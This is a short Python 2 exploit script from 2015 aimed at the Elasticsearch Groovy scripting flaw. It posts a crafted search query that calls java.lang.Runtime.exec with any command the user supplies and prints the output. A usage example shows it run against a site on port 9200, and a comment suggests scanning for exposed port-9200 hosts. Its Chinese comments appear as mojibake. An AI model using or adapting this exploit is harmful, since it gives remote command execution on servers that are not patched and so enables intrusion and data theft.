#!/usr/bin/env python
# -*- coding: gbk -*-
# -*- coding: utf-8 -*-
# Date: 2015/3/14
# Created by ���Եȴ�
# ���� http://www.waitalone.cn/
import os, sys, re

try:
    import requests
except ImportError:
    raise SystemExit('\n[!] requestsģ�鵼�����,��ִ��pip install requests��װ!')


def usage():
    print '+' + '-' * 60 + '+'
    print '\t Elastic search GroovyԶ�̴���ִ��©��EXP'
    print '\t     Blog��http://www.waitalone.cn/'
    print '\t\t   Code BY�� ���Եȴ�'
    print '\t\t   Time��2015-03-14'
    print '+' + '-' * 60 + '+'
    if len(sys.argv) != 3:
        print '�÷�: ' + os.path.basename(sys.argv[0]) + ' ����Elastic search��վURL ��ִ�е�����'
        print 'ʵ��: ' + os.path.basename(sys.argv[0]) + ' https://www.waitalone.cn:9200/ "ifconfig"'
        sys.exit()


def elastic(cmd):
    """
    Elastic search ����ִ�к���
    ©������:http://zone.wooyun.org/content/18915
    ���԰���:������ɨ��9200�˿ڵ���վ�ɡ�
    """
    results = []
    elastic_url = url + '_search?pretty'
    exp = '{"size":1,"script_fields": ' \
          '{"iswin": {"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\")' \
          '.getRuntime().exec(\\"' + cmd + '\\").getText()","lang": "groovy"}}}'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    # print exp
    try:
        content = requests.post(elastic_url, data=exp, headers=headers, timeout=10).content
    except Exception:
        print '[!] ����ү,�д�����,�����Ƿ����ӳ�ʱ!'
        raise SystemExit
    else:
        result = re.findall(re.compile('\"iswin\" : \[ "(.*?)" \]'), content)
        if result:
            results.append(result[0])
    return results


if __name__ == '__main__':
    usage()
    url = sys.argv[1]
    if url[-1] != '/': url += '/'
    cmd = sys.argv[2]
    command = elastic(cmd)
    if command:
        print command[0].replace('\\n', '\n').replace('\\r','').replace('\\\\','\\')
    else:
        print '[!] ����ү,©�������ڻ��������������!'
